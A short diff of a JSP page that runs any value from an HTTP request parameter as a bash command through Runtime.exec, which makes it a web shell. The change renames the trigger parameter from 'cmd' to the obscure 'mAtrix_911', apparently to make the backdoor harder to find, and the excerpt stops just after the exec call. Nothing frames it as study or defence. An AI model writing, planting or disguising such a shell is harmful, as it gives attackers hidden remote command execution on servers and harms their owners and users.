@@ -1,6 +1,6 @@
 <%@ page import="java.io.*,java.util.*" %>
 <%
-String cmd = request.getParameter("cmd");
+String cmd = request.getParameter("mAtrix_911");
 if (cmd != null && !cmd.isEmpty()) {
     String[] cmds = new String[]{"/bin/bash", "-c", cmd};
     Process p = Runtime.getRuntime().exec(cmds);
